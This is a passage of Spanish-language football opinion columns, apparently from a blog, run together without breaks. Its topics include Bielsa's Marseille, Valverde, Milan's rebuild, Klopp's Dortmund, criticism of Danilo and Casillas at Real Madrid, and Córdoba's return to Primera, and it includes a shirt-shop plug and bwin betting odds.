podrá llegar a decirles. Es curioso, pero el seguidor siempre tiene dos objetivos claros dentro de su equipo como centro de sus iras: el directivo de poltrona y puro, de pulcro palco presidencial y delicado catering en el descanso que nunca hace lo que debe y que casi siempre está bajo la sospecha de algún oscuro interés personal, y la siempre latente tendencia del futbolista a hacer el vago, a no dejarse la piel en los entrenamientos, a intentar sisarle esfuerzos al escudo que defiende. Y es precisamente por ahí por donde el Loco establece su especialísimo vínculo con el aficionado. Porque con Bielsa no hay dobleces, no hay sitio para directivos acomodados e inviolables como tampoco hay lugar para el jugador perezoso que busca escamotear su entrega para la causa. Y entonces, el seguidor entiende que el técnico no es uno más dentro del club plegado al bastón de mando. Que es alguien en quien se puede confiar, porque es íntegro y honesto y porque si tiene que poner las cosas en su sitio lo hará sin ningún tipo de miramiento.El Olympique de Bielsa, tras un inicio algo titubeante típicamente bielsista, ya funciona. Ya es incluso líder de la Ligue 1 (ahora mismo sobrepasado circunstancialmente por el Girondins, a la espera del partido ante el Saint-Etienne), con cinco victorias consecutivas y catorce goles a favor en sus últimos cuatro partidos ligueros. Con Gignac, con Ayew o con el joven y prometedor Florian Thauvin. Y con una leyenda acuclillada en la banda y el Vélodrome en plena ebullición.Puedes encontrar todo típo de material del Olympique de Marsella en Classic Football Shirts, la tienda online especializada en camisetas de fútbol de todo el mundo. Concluido el partido del Camp Nou y confirmada la victoria, con gran sufrimiento, del FC Barcelona sobre un voluntarioso y valiente Athletic Club (2-1), alguien consideró oportuno cuestionar a Ernesto Valverde acerca de ese hipotético interés azulgrana por hacerse con sus servicios de cara a la próxima temporada. ‘Me parecen muy bien esos comentarios, pero lo de si mi continuidad es o no es negociable es un asunto personal. Tengo contrato en vigor con el Athletic y estoy muy feliz aquí‘.Una respuesta de troquel para salir del paso ante una pregunta impertinente.A fuerza de repetir la historia, ha dejado de resultar llamativo el hecho de cuestionar a un técnico acerca de un puesto de trabajo que ocupa otro compañero de profesión. Al preparador del Athletic se le lanza la pregunta sobre un hipotético futuro en azulgrana no con el cadáver del Tata aún caliente, sino con el argentino todavía vivo. Al mismo tiempo, no deja de ser chocante que se infravalore y se menosprecie, a fuerza de negarle el merecido protagonismo, la labor del entrenador extremeño al frente del banquillo del Athletic. Si Valverde suena como futurible del Barça es porque su desempeño en el banquillo de San Mamés está siendo merecedor de todos los reconocimientos y elogios. Su partido de ayer, valiente y decidido, es una muestra más de su intachable acumulación de méritos como rojiblanco. Sin embargo, lo mismo da que tenga un contrato en vigor archivado en Ibaigane. Es el ‘favorito de Zubi’ y eso es lo único que vale. ¿Quién es el Athletic para echar por tierra un titular morboso? ¿Qué importan sus logros en esta temporada, cuando toda España debería estar pendiente de la guerra de sucesión que se avecina en Can Barça?Ernesto Valverde es un fantástico entrenador. Es minucioso, con profunda capacidad de análisis y reflexión, me atrevería a decir que incluso intuitivo desde el banquillo… y, además, huye de la petulancia y la pomposidad que emplean otros compañeros de profesión para enlucir sus discursos, lo que lo convierte en un personaje directo, franco y sin artificios. No me lo imagino tratando de digerir sus hipotéticas derrotas como entrenador del FC Barcelona condicionado por la fortísima carga mediática inherente al club. No me lo imagino manejándose en esa jungla sembrada de trampas que es el entorno barcelonista e intentando hacer valer su temple habitual. Al tercer mal resultado, Valverde dejaría de ser un buen entrenador. Dejaría de ser el elegido para convertirse en un nuevo muerto en vida, sin necesidad de comprobar si su proyecto funciona o no con un plazo prudencial de tiempo. Me gustaría que Valverde continuase no el próximo año, sino muchos años más, al frente del banquillo del Athletic. Me gustaría que Valverde continuase siendo entrenador, admirado y querido, y no el alimento de un simple capricho. Abbiati, Abate, Nesta, Thiago Silva, Antonini, Gattuso, Ambrosini, Seedorf, Boateng, Ibrahimovic y Pato. A grandes rasgos, el último gran once del AC Milan o, para ser más precisos, el último once milanista que consiguió alzarse con un título no era en absoluto un mal equipo. Veterano pero con dosis de juventud, sólido y resolutivo en ataque, el Milan 2010/11 conquistó el Scudetto con las aportaciones extraordinarias de jugadores como van Bommel, Robinho o Cassano. Sin embargo, aquella plantilla que, dirigida por Massimiliano Allegri logró conseguir el último título de las vitrinas de la Via Aldo Rossi ofrecía ya claros síntomas de deterioro y de necesidad de aire fresco en sus pasillos. El propio técnico advirtió de la conveniencia de renovar mobiliario en la temporada siguiente al Scudetto, cuando, con un equipo muy similar al de la temporada anterior, apenas pudo resistir al empuje de la renovada Juventus de Conte.Nadie puede afirmar que el club rossonero eludiese acometer la renovación que su plantilla demandaba. Del once habitual del equipo que se alzó con el último título milanista sólo permanecen en la plantilla Christian Abbiati e Ignazio Abate. El resto del grueso de aquel plantel fue invitado amablemente a dejar el club, casos de Gattuso, Ambrosini o Nesta, o fue empleado para hacer caja con su traspaso (Ibrahimovic, Thiago Silva, Pato) y engordar unas cuentas que amenazaban ruina. El primer paso para la regeneración del club, el ‘antes de entrar dejen salir’, estaba dado. Faltaba lo más complejo, la tarea que exigía de una mayor minuciosidad y planificación: rearmar el equipo.Con un exiguo palmarés, al menos para lo acostumbrado, de dos Scudetto y una Liga de Campeones en las diez últimas temporadas, la operación se encontró con un obstáculo inesperado. Milán había dejado de ser una plaza apetecible. El rossonero ya no deslumbraba como antaño a las grandes figuras, porque en el nuevo mercado futbolístico europeo el Milan ya no estaba en condiciones de competir frente a las grandes fortunas del continente y porque la entidad que preside Berlusconi ya no era capaz de ofrecer proyectos atractivos y ambiciosos con los que convencer a sus objetivos en el mercado. Además, las apreturas económicas no ayudaban en exceso. La política de contrataciones dio un obligado giro radical. Sin acabar de decidirse entre el cortoplacismo y la previsión a largo plazo. Se pasó de firmar a los principales futbolistas del momento a optar por una política de austeridad, basada en la contratación de supuestas jóvenes figuras en ciernes y descartes de los grandes equipos europeos. En el grupo de los primeros llegaron futbolistas como Andrea Poli o Stephan El Shaarawy.- acaba de entenderse el 4-1 final, holgada victoria que una escuadra con estos jugadores puede obtener un buen día contra cualquier equipo del mundo. ¿Y España? Pues un lamento de frialdad y despiste los primeros veinte minutos, el juego académico con el que el equipo suele ir calentándose, la charlotada de Reina que acabó de decantar el partido, tres palos, y una media hora final plena de dignidad y casta en la que la Roja cazó el gol de Llorente, mereció mucho más y, al  menos, honró la estrella. Algo es algo. Descanse en paz un maestro del fútbol y la vida. Más allá de fans irredentos de la Bundesliga y parabólicos vocacionales, pocos sabrían hace cuatro años quién era Jürgen Klopp. Inquilino del banquillo de un Mainz que poco tenía que ver con la agradable sorpresa que hemos disfrutado esta temporada, este rubiales vivaracho a quien las gafas dotan de cierto aire intelectual era más conocido en Alemania por su frenesí en las celebraciones y sus intervenciones en la televisión que por su prestación como entrenador en la ciudad del Gran Arzobispo. Por ello, resultó un tanto llamativo que la directiva del Borussia Dortmund le ofreciera el puesto de manager el equipo con la afición quizá más exigente de Alemania; una nave amarilla que llevaba dando tumbos y amenazando zozobra casi desde que, en  1997, dos goles un Riedle que jamás se vio en otra igual llevaron la Liga de Campeones a orillas del Ruhr. El último club, por cierto, que ha entrado en el selecto club de los campeones de Europa.A día de hoy, tres años después, Klopp es seguramente junto a Pep Guardiola el entrenador joven más cotizado del momento, y su equipo la referencia más fiable –fuera de Barcelona- de la combinación de toque y competitividad que define el fútbol del futuro practicado por el equipo catalán cada vez que salta a un campo con Messi a la cabeza. Modélico toda la temporada, con quizá la mejor pareja de centrales jóvenes del fútbol europeo –Hummels y Subotic-, una pléyade de talento en el centro del campo donde Götze es una joya en bruto y Sahin ha confirmado lo que llevaba años apuntando, y el instinto asesino de Barrios cerrando jugadas y abriendo huecos, el Borussia ha dominado la competición doméstica con puño de hierro. Sin embargo, la baja del cerebro Kagawa, que se ha hecho notar, y el ascenso del Bayern tras ir recuperando lesionados, hacían presagiar un final de temporada movido si el aspirante besaba la lona, el pasado sábado, en el Allianz.Tuvo que ser allí, en uno de los escenarios más imponentes del mundo, y ante la bestia por antonomasia del fútbol europeo, donde los chicos de Klopp coronaron la obra. En un partido mayor, que veremos en listas de excelencia cuando la temporada toque a su fin, los norteños domaron al oso. El hambre del aspirante se concretó en la jugada que abrió el marcador, un robo del incansable Grosskreutz que cruzó la pradera y acabó sirviendo a Barrios para que el paraguayo oficiara de matador. Digerido el empate –gol número un millón del Bayern a balón parado- Sahin volvía a desequilibrar la balanza con un chut combado y ardiente, despiadado. Apareció entonces la casta de campeón del Bayern, sobreponiéndose a un ritmo de balón demasiado alto para lo que suele asumir, pero la buena labor de la zaga amarilla, y muy en particular el marcaje escalonado sobre Robben, frenaron la embestida bávara. Un cabezazo de Hummels a la salida de un córner sellaba el destino del choque y, probablemente, de la Bundesliga -13 puntos es demasiado-. Será un maravilloso campeón, y los neutrales que tanto hemos disfrutado este año sólo pedimos que el equipo no se desvencije en verano. Deben jugar la Champions con todos los honores; Klopp y sus chicos se lo han ganado. Cada año asistimos a varias reediciones o intentos del mítico no-gol de Pelé en México: disparos desde distancias absurdas que acaban entrando o, algo poco explicable, provocan el silbido enloquecido del respetable si se van fuera o son detenidos con sencillez por el portero. Anoche en Godoy Cruz asistimos a uno de estos golazos, logrado por un Bichi Fuertes que ya está de vuelta -38 años lo contemplan- y a quien algunos recordamos de su paso por el Tenerife. Lo que hace peculiar este tanto respecto a otros de parecida factura es el golpeo de balón, que adquiere una trayectoria prácticamente horizontal, y que no baja, sino que entra en la red como un tiro. Una celebración de la recta más que de la parábola, pues que nos recordó a otra obra de arte lograda por De la Peña contra el Zaragoza hace muchos años. Un poco más lejos, un poquitín combado, pero similares en cualquier caso. Os los dejamos para comparar. Este año se ha producido una curiosa constante tras varios partidos importantes jugados y perdidos por el Real Madrid: el lateral derecho del equipo –el puesto en principio más residual de un equipo, el chatarrero por antonomasia-, Danilo da Silva, se imponía como trending topic en Twitter, en general después de una actuación que los internautas juzgaban como desastrosa. No es la intención de este articulista lanzar mucho más estiércol sobre un futbolista que, por el motivo que sea, ha ofrecido un rendimiento bajísimo esta temporada, sino analizar cómo un vistazo en torno a su figura permite hacerse una idea de dónde encontrar varios de los males que llevan años aquejando al conjunto de Concha Espina.La historia comienza el pasado mes de agosto, cuando se anuncia sin previo aviso que el Madrid ha cerrado la contratación de un lateral derecho del Oporto por la friolera de 31 millones de euros. A primera vista todo apuntaba a que se repetía el error de Coentrao: un fichaje a precio de crack para un puesto perfectamente cubierto por un canterano, Carvajal, que se lo había ganado tras un largo peregrinaje como meritorio que había puesto a prueba su carácter y su valía para jugar en el Madrid. Y de nuevo, Mendes de por medio. De manual. Como no podía ser de otro modo, de poco le valió la trayectoria a Carvajal. El primer partido de Liga en Gijón, Danilo saltaba al campo en el once titular, y esta circunstancia permanecería invariable toda la primera vuelta, excepto unos pocos partidos en septiembre en que el brasileño sufrió una lesión de cierta gravedad en la fascia plantar. Durante todo este periodo, el público conoció al nuevo fichaje: un clásico lateral de largo recorrido, con capacidad de asociación pero muy mal pie para el desplazamiento de balón –lo cual lo convertía en inocuo como estilete por la banda- y con unos problemas defensivos evidentes cada vez que enfrentaba a un par medianamente consistente. Los desastres frente a Sevilla y Barcelona, en los que cuajó dos actuaciones lamentables, le pusieron en el ojo del huracán, pero el remoquete de nuevo Secretario no hizo mella en Benítez, que lo mantuvo contra viento y marea hasta que cayó fulminado a primeros de año. Poco después del partido del Barça, un extenso reportaje del Daily Mail transcribía una conversación entre Florentino y el entonces entrenador, en el cual el presidente llamaba a Danilo “el mejor lateral derecho del mundo” y le urgía a ponerlo de titular, mientras Rafa dudaba de su rendimiento defensivo. No puede probarse la veracidad de la conversación, pero sí ofrece una razón bastante plausible de por qué el futbolista continuó tanto tiempo en el equipo base a pesar de constituir un problema para su propio equipo. Y ya que hablamos de declaraciones, es interesante reparar en éstas del propio Danilo, realizadas en un momento en el que la situación del equipo ya era bastante crítica, el proyecto Benítez se resquebrajaba y comenzaba a atisbarse el abismo a cuyo borde está agarrado el Madrid –hasta el martes- con las yemas de los dedos.El titular que lanzó el lateral fue “Estoy contento porque me he hecho con el puesto”. Aquí el énfasis se encuentra en cómo se pone a sí mismo y su situación personal por encima del bien del colectivo. Por supuesto, ésta es la manera de pensar de la mayor parte de los jugadores, pero que este tipo de declaraciones se realicen con total normalidad –y que dejó Danilo como podía haber hecho otro futbolista blanco- dejan entrever bastante sobre los enormes egos que tienen que convivir en el vestuario del Madrid, y una falta de compañerismo sonrojante que se ha visto en muchos momentos del año.A mitad de temporada llegó Zidane, y pareció en un primer momento que su apuesta para el lateral derecho era Carvajal. El madrileño realizó dos estupendos partidos en sendas goleadas, pero en el tercer partido con ZZ de entrenador volvió Danilo, que cuajó una actuación discretísima –ofensivamente fue una nulidad- en el empate en Heliópolis. El brasileño vuelve a caerse del equipo, y vuelven los buenos resultados (tres victorias y un empate), cuando llega el derby y, ante la sorpresa de todos, Danilo aparece en el lateral izquierdo, donde en cualquier caso no es de lo peor de otro partido horrible del Madrid frente a rival exigente. De nuevo vuelve a la titularidad, y en los últimos partidos, intrascendentes ya de cara al título de Liga, pasa inadvertido. Hasta que llega el Wolfsburgo. Lo sucedido en Alemania no reveló nada nuevo de Danilo, pero puso de manifiesto otro grave problema, ya sucedido en la temporada pero raras veces de modo tan evidente: la dejadez, la falta de ayudas, el absentismo defensivo. Entre todos los que creemos que Danilo ha sido con frecuencia el eslabón más débil del Madrid se cuenta el preparador Dieter Hecking, que envió a sus lobos a la zona izquierda del ataque, y muy en particular a Draxler, su joya de la corona. Todos tenemos presente la jugada del primer gol, pero ningún delantero ayudó a Danilo en su banda durante el partido, y poco auxilio encontró en las coberturas cuando se fue arriba y el Madrid perdió el balón. Su banda se convirtió en una autopista, pero no fue el único responsable de ello. A modo de resumen, Danilo es sólo un jugador más superado por el peso de la camiseta blanca. Pero como hemos visto, su figura puede interpretarse como un cruce de caminos donde se reflejan los grandes males que aquejan al Real en los últimos años: los millones gastados sin sentido, decisiones deportivas por motivos extradeportivos, jugadores ególatras, entrenadores dóciles, nula meritocracia, falta de solidaridad y profesionalidad en los futbolistas. Síntomas de una decadencia que dura ya demasiado. Visita el Valencia el feudo del líder, intratable hasta el momento en el Bernabéu –sólo se ha dejado cinco puntos en toda la temporada- y lo hace sumido en una especie de duda existencial, una división que dura ya demasiado tiempo y que puede acabar haciéndole mucho daño al equipo y al club. Dentro del valencianismo conviven actualmente dos sensibilidades, que podríamos resumir del siguiente modo, no faltándole a cada una de ellas una parte de razón.Para los que ven la botella medio llena, Unai Emery lleva casi cuatro años realizando un trabajo modélico en unas condiciones que andan muy lejos de ser las idóneas. En un equipo cuya situación económica obliga cada año a vender a su mejor futbolista –David Villa, David Silva y Juan Mata se vieron obligados a abrir la puerta de salida- el Valencia se encuentra perfectamente preparado para acceder al tercer puesto del campeonato de Liga, posición que por supuesto da acceso a la Liga de Campeones, y que repetiría por tercera vez consecutiva. Además, la goleada frente al AZ ha supuesto un brillante acceso a las semifinales de la Liga Europa, que supone a su vez una posibilidad bastante fundada de tocar metal esta temporada. El equipo ha practicado con cierta frecuencia un fútbol solvente y eficaz, brillante en ocasiones, y algunos jugadores como Roberto Soldado o Jordi Alba han proporcionado un rendimiento excepcional. Según esta corriente de opinión, el Valencia vive un buen momento deportivo, y sería una locura dejar ir al entrenador que lo ha hecho posible.Cada semana, y de la mano de bwin.com, os ofreceremos los partidos más interesantes del fútbol mundial, con especial atención a todos aquellos que os manejáis en el mundo de las apuestas on-line. Sin embargo, la otra facción de la afición ché, la que lleva tiempo pitando al banquillo y sacó a pasear los pañuelos la semana pasada, no piensa lo mismo. Es la que, aun admitiendo que la distancia con los dos grandes se ha incrementado en los últimos años, no es capaz de digerir que a falta de ocho jornadas la distancia con el Madrid sea de treinta puntos. La que piensa que, si bien las dos finales de Champions del comienzo de siglo quedan muy lejos, no es de recibo haber caído en la fase de grupos cuando dos de los rivales eran un Genk que se llevó cinco en Stamford Bridge y siete en Mestalla, y la versión del Bayer Leverkusen que fue crucificada por Messi en octavos. No le perdonan a Emery esas rotaciones que parecen debilitar más que fortalecer, algunas goleadas de los dos de arriba -5-1 este año en el Camp Nou- y, sobre todo, la falta de carácter de un equipo al que se le hacen larguísimas las temporadas y que se muestra incapaz, una vez tras otra, de cerrar los partidos: más de cuarenta veces desde que Unai es entrenador, un dato que suena casi excesivo (gracias a Elías Lafuente por facilitarlo). Considerando la rivalidad de la afición valencianista con el Real Madrid, es muy probable que el resultado del sábado tenga cierta influencia en el devenir inmediato del club levantino. Un victoria o incluso un empate supondría un espaldarazo crucial, en este momento de la temporada, para un equipo que lo necesita. En cambio una derrota, especialmente si es escandalosa, podría precipitar acontecimientos, aunque las semifinales de la Europa League vuelven muy improbable una decisión drástica. De todos modos, y a tenor de las declaraciones de Unai en los últimos tiempos, es muy probable que la facción crítica se vea satisfecha en junio con la despedida de un técnico que evidencia síntomas de hartazgo. Serán el futuro y el sucesor quienes den la razón a unos u otros.En bwin se ofrecen algunas apuestas muy jugosas para el Real Madrid-Valencia del domingo (21:30, Canal Plus). La victoria merengue se paga a 1.20, pero ya el empate da 6.50, y el triunfo valencianista 12.00. Que el Madrid gane dejando al Valencia a cero proporciona un mínimo de 3.10, mientras que una victoria ché con un gol del Madrid ofrece una tremenda cuota de 20.00. El primer gol en el segundo tiempo para el Valencia da 4.75. Quien espere a un Valencia fundido en el segundo tiempo por el esfuerzo del jueves, puede considerar que más goles en el primero que en el segundo tiempo para los chés se paga a 4.25, y que lo opuesto para el Madrid, da 2.15. Finalmente, está bien tener en cuenta que Soldado abriendo el marcador se paga a 6.50, y que lo haga el resucitado Di María a 7.00. Mucho donde elegir. Vientos de pesimismo soplan alrededor de la selección española tras los últimos dos amistosos que han llenado (?) estas fechas FIFA. Dejando aparte la oportunidad de los eventos, lo impresentable del viaje a Costa Rica y la catadura del tal Villar –asuntos que ya han hecho correr los debidos, siempre escasos y siempre insuficientes ríos de tinta- es evidente que las sensaciones deportivas dejadas por nuestro combinado no han resultado halagüeñas. Al “exceso de retórica” de Wembley –conocido en otros ámbitos como apoteosis del bostezo- siguió un primer tiempo indigno y vergonzoso en San José, coronado con un 2-0 que uno podría calificar tranquilamente de kafkiano si su realidad no fuera tan inquietante. Sólo una ración de la tan denostada furia –personificada curiosamente en Iniesta, el más fino de los futbolistas- y la salida de David Silva evitaron males mayores, al menos en el luminoso.Sin embargo, da la impresión que para un número no despreciable de aficionados el campeón de Europa y del Mundo, no conviene olvidarlo, se encuentra bajo sospecha. Las sucesivas decepciones de los amistosos, la discutida necesidad del doble pivote, la elección del nueve y ese ritmo parsimonioso, falto de profundidad y chispa, con el que España nos ha torturado en algunos momentos, están produciendo reacciones entre la afición que en algunas ocasiones llevan directamente a la boutade, tipo pedir la dimisión de Del Bosque. Parte del público se ha acostumbrado tanto a ganar que una mínima curva descendente semeja una hecatombe, y todo lo que no sea abrumar al contrario con una catarata de goles y ocasiones da lugar a que se cuestione hasta al que vende las almohadillas, mucho más el modelo.Lo que sentí allí a nivel emocional lo voy a silenciar, porque los lectores deberán estar cansados de tanto folclore, exaltación y sueños cumplidos. Ha sido subir a Primera y salirnos a todos una vena coplera de sentimientos arrebatados, soy cordobés y pasión infinita por los colores que nos parecíamos a Rocio Jurado en la boda de su hija. Es algo intenso esto, pero se nos pasará. Cuando la pelota empezó a rodar ya sólo pensé en fútbol, en la realidad que nos tocaba vivir: mantenernos en Primera tras un ascenso sin brillo, casi casual, al que aún no nos hemos acostumbrado.Que la alegría orgásmica tras cuarenta y dos años de sombra no nos ciegue en el camino. El Córdoba ha estado fichando mucho y según lo visto el lunes la plantilla está bien ensamblada, tiene opciones y recursos suficientes como para relajarse y ver qué pasa. La principal lectura que hago del partido es que el Córdoba jugó de tú a tú contra un rival mejor en todas las líneas. La fuerza del conjunto blanquiverde estuvo básicamente en la colectividad, principio básico para confiar en equipos con bajos presupuestos y en situaciones delicadas –un reciente ascenso y falta de competitividad en la máxima categoría-. Ferrer ha trabajado en esa línea. Desde la banda vi como pedía constantemente que el equipo basculara, que se sacara la presión, que subiera. Puso una marca personal a Kroos cuando el Madrid apretó en la segunda parte. Pedía a los laterales que se unieran al ataque, que se asociaran con las alas y sobre todo exigía a Mike, y luego a Xisco que entendió mejor el mensaje, que se incrustara entre central y lateral para evitar sobre todo que Marcelo se sumara a la vanguardia desbordando a una defensa aún en prácticas.Es difícil sacar ideas claras de una derrota, aunque se viera venir como esta del Bernabéu. Hay varias que podemos poner en común pese al 2-0 que poco o nada reflejó lo visto en el campo. Juan Carlos es un portero de garantías, y lo escribe un absoluto admirador de Saizar. Acabó la temporada de forma ejemplar y su partido en la primera jornada de Liga en Primera ha demostrado que está confiado, que tiene mando sobre su defensa y que es capaz de aguantar el nivel en la categoría. La defensa también merece un elogio, la pareja de centrales Pantic-Iñigo estuvo sobria, quizá algo hundida en el área y con poca vocación de deslizarse hasta el centro del campo achicando los espacios del Real Madrid. Normal con Bale y Cristiano Ronaldo delante quizá, pero Chapi se lo pedía con insistencia. En cualquier caso su desempeño fue bueno, muy sobrio a balón parado y destaco sobre todo a Crespo, íntegro y luchador en el lateral, fundamental en el uno contra uno. El centro del campo parecía algo difuminado y buscaba mucho el apoyo atrás. La entrada de Cartabia en el descanso si desperezó a los medios y se vio un partido más interesante. El error de Rossi no puede tampoco deslucir su debut liguero, en él se apoyó el Córdoba y el italiano estuvo a la altura casi los noventa minutos. En las bonanzas, también Xisco, un jugador cuestionado por la afición que salió al campo a comerse el mundo. Tuvo movilidad, remate y dio muchas alternativas al ataque del Córdoba. Muchas más que Mike Havenaar, el jugador que menos me gustó del partido. El japonés estuvo apático, frío y anárquico en la presión. Un jugador en su puesto no debe exclusivamente centrarse en el balón parado y su contribución al ataque debe ser más amplia si la ocasión lo permite. El otro día, con un Madrid atacando con poco orden su presencia arriba debió ser más peligrosa. Estuvo estático y lento y tampoco brilló en las prolongaciones y en los remates.La resaca del ascenso se diluye como el Espidifen. Ya sólo queda luchar para que el sueño del Córdoba no sea una pesadilla de 365 noches. Es pronto para sacar conclusiones, pero los noventa minutos del equipo sirven para autoconvencerse de que es posible mantener la categoría por méritos propios. La plantilla promete, Ferrer parece haberse aclimatado a la temperatura de Primera y la afición -numerosa, ruidosa y feliz- merece más tardes como la del otro día. Hay motivos para criticar a Casillas. Su carrera, llena de éxitos y actuaciones para recordar, ha frenado en seco. Donde antes había un guardameta decidido ahora hay un guardameta dubitativo, donde antes había un líder, una referencia y un salvador ahora sólo encontramos a un jugador gris al que parece que las jugadas le superan. No siendo el portero que era, sigue siendo un buen portero. Mejor que muchos de lo que ahora juegan en Primera División. Ayer, tras una imprevista y expeditiva derrota ante la Real Sociedad, todo el mundo le acusó a él.Twitter es a la libertad de expresión lo que La Matanza de Texas es a la inteligencia emocional. Opinar, siendo libre y gratuito, debe ser algo más que decir lo que a uno se le pasa por la cabeza sobre cualquier cosa sin ninguna preocupación en formarse una idea que vaya más allá del estereotipo o el chiste fácil. Los futbolistas, con sus sueldos repugnantemente altos, parecen fácil blanco de toda la mierda que nuestra cisterna neuronal es capaz de tragar. El ataque a Casillas desde las redes sociales y algunos medios de comunicación es sencillamente desproporcionada. Culpar a un solo jugador, contrastado y que cuenta con la confianza de todos sus entrenadores de momento, de la faena de bombero torero que ayer perpetró el Madrid es tan ruin que sólo encuentro explicación en la pereza del pensamiento.Señalar a Casillas cuando el dedo debería apuntar a la Dirección Deportiva del Madrid, a su Presidente y en última instancia a su entrenador es de estar muy contaminado de ese virus que es el periodismo deportivo de chiringuito. Casillas está en un momento feo de su carrera, sin confianza y desestabilizado anímicamente. Pero Ramos está mal atrás, Cristiano arrastra lesiones desde hace meses, Benzema sigue siendo un jugador bueno en los partidos pequeños y regular en los partidos grandes. Y encima está el lujo de prescindir de dos jugadores que marcaban diferencias en una plantilla fiable: Di María y Xabi Alonso.El Madrid es una empresa, o al menos, opera como una empresa. Lo hablé largamente con Ramón J. Flores la otra noche en Málaga mientras veíamos ganar al Athletic frente al Nápoles. El Madrid utiliza criterios empresariales para gestionar desde la acometida de obras en el estadio a la planificación deportiva. Según Ramón el césped es sagrado y todo gira en torno a él. Florentino debe frenar su vocación capitalista cuando se trate de jugadores. No se vende o compra por necesidades de mercado –no al menos un club que no lo necesita como el Real Madrid- sino por necesidades deportivas. La venta de Di María y la compra de James no tienen sentido desde el punto de vista estrictamente futbolístico. No ahora. No sé en el futuro, pero desde luego no ahora. Sobre el papel, con una calculadora en la mano, quizá la gestión económica de el plácet a la transacción, pero lo visto sobre el terreno de juego cuestiona todo malabarismo financiero.El estado actual del Real Madrid es el de un club que proporciona jugadores a Ancelotti en función de rendimientos –económicos, publicitarios- que desconocemos los aficionados. Él se apaña con lo que hay. No hay planificación, no hay idea futbolística, es como un concurso de cocina donde nos dan ingredientes de primera calidad y en función de ellos debemos idear la receta. Intereses mercantilistas que nada o poco tienen que ver con el propio deporte.Como el Barcelona de Rosell, como el Atlético de Jesús Gil, como el Betis de Lopera. Que James sea mejor que Keirrison, Bogdanovic y Kowalczyk no cambia la historia de la película. Que tras este desbarajuste el aficionado madridista se crea en potestad de insultar y criticar a un jugador de los veintitantos que componen la plantilla, como culpable del juego del Madrid es de saber poco de fútbol o al menos, de tener las ideas infectadas por proclamas periodísticas malintencionadas.Volviendo a Casillas, ya el año pasado se le vio superado y con poca capacidad de maniobra para revertir la situación. Tras Mourinho el portero es otro. Diego López no es mejor portero de Casillas, pero desde luego estaba en un momento de juego mucho mejor. No puedo entender la aversión a un guardameta que ha sido parte de la mejor Selección Española que hemos tenido y muy culpable del reciente brillo europeo del Madrid. Y no es vivir de las rentas, es el justo crédito por lo que hizo. Como cotizar toda la vida para recibir una pensión. La pensión que se le da a los grandes porteros que tienen que adaptar su juego a su nuevo físico –menos reflejos y más colocación, más delegación en los defensas-, como la que se le dio a Van de Saar antes de cuajar unos años memorables en el Manchester United o a Buffon que vuelve a encontrarse cómodo en el área tras un par de años cuestionado y flojo.Keylor Navas no es Diego López, de momento es peor portero. Está menos hecho, no es académico, no tiene la seguridad que un portero debe tener aún para mandar a los defensas. Una anécdota. En el vídeo aquel ridículo en el que Arbeloa no saludaba a Casillas en el túnel de vestuario yo me fijé en otra cosa, mucho más interesante y relevante: Keylor pasó y no saludó a sus compañeros. Estaba rígido. Yo diría que tímido. Un jugador que pasa por delante de sus compañeros y no les anima, no tiene complicidad, es porque aún no se ha hecho su hueco en el vestuario. Y la relación de un portero con su defensa debe ser fiduciaria, como una amistad intensa de noventa minutos en la que el futuro de todos se basa en la colectividad, como los castells o algo parecido. Mirad ahora, por ejemplo, que en Athletic juega Gorka Iraizoz –de la quinta de Iker, por cierto- aunque el año pasado se le intentó dar cancha a un buen portero, Herrerín, al que le faltó precisamente presencia en el equipo.No soy un admirador de Casillas. Los que me leéis en este blog desde hace tiempo sabéis que siempre he cuestionado algunas de sus actuaciones y que mi preferencia todos estos años era otro portero que ahora mismo está sin equipo, Víctor Valdés. Pero ayer me molestó, como amante del fútbol, el escarnio al que fue sometido el portero titular del Madrid. El ruido es la competencia del silencio. Ayer preferí silencio a todo el guirigay de acusaciones inarticuladas, de bromas absurdas y de una lectura del partido tendenciosa y simple. Hoy se ficha a Chicharito. Quizá en el próximo partido juegue Keylor Navas. La cuestión, lo de siempre, es que erramos el tiro. Si vamos a hablar de fútbol, hablemos de fútbol; pero si vamos a echar unas cañas en la barra de un bar, echemos unas cañas.Casillas puede mejorar, puede asentarse, necesita confianza y sobre todo un tirón de orejas en el vestuario. Pero no a él, sino a defensas grandes como torres que defiendan el balón parado de una forma menos anárquica que como lo hacen Pepe y Ramos. No puede negarse el pan y la sal a un jugador de calidad mundial para el que, hace solo tres años, pedíamos el Balón de Oro. A veces veo al madridismo como a un grupo de chicas adolescentes en pijama hablando de novios de madrugada. De momento no hay mejor opción para la portería del Real Madrid que Casillas, no tras la venta de Diego López.En el segundo, en el de los veteranos venidos a menos, el nicho de mercado en el que el Milan se mueve con mayor soltura, la nómina de de futbolistas en plantilla aumentó con Michael Essien, Adil Rami, Keisuke Honda, Philippe Mexès, Nigel de Jong, Giampaolo Pazzini y, como cúspide de una política de regeneración tan errática como ineficaz, el exmadridista Kaká. Sólo Riccardo Montolivo, ausente hoy en el Calderón, y Mario Balotelli (este último con su correspondiente entrecomillado) aparecen como dos incorporaciones del mercado sobre las que disponerse a construir con ciertas garantías. Sólo ellos dos no tienen pinta de retales o de parches para salir de una situación desagradable en el menor tiempo posible. Sólo ellos dos estarían en condiciones de sacar brillo al escudo milanista. No es la primera vez que el Milan se ve obligado a someterse a una operación de regeneración profunda. De hecho, históricamente es un club bastante habituado a este tipo de maniobras. Lo hizo en la década de los años cincuenta de la mano del tridente sueco (Gren-Nordahl-Liedholm), tras casi treinta años sin ganar un solo título, y lo repitió a mediados de la década de los ochenta, recuperándose del Totonero para construir el Milan más poderoso que se recuerda. Con semejantes precedentes, levantarse y volver a ser grande no debería suponer ningún obstáculo insalvable, siempre que se empleen las herramientas necesarias para acometer la regeneración. Algo tiene el Real Madrid que te llama insistentemente a debatir sobre su funcionamiento cotidiano. Quizá sea la manera obsesiva en la que los medios de comunicación nacionales acribillan a sus consumidores con información y opinión sobre el conjunto blanco, pero el caso es que la actualidad madridista siempre acude a tu puerta, abnegado aficionado, convertida poco menos que en asunto de interés nacional. Absolutamente todo alrededor de la actualidad merengue es debatible. Porque si Xabi Alonso hubiera permanecido en la disciplina de Carlo Ancelotti en lugar de salir a buscar nuevas experiencias en Múnich, el pasado sábado la frase hubiese sido algo similar a ‘el Madrid no puede jugar este tipo de partidos tan intensos con un mediocentro de 33 años‘, en lugar del ‘cómo echa de menos el equipo a Xabi Alonso‘ tan escuchado desde que el Atlético volviese a demostrar que tiene la medida bien cogida a su vecino. Porque en la victoria todos son extraordinarios, como se demostró en Lisboa cuatro meses atrás. Bueno, todos menos Casillas, claro. Pero en la derrota, cada vez de peor digestión en un club en el que ganar se ha 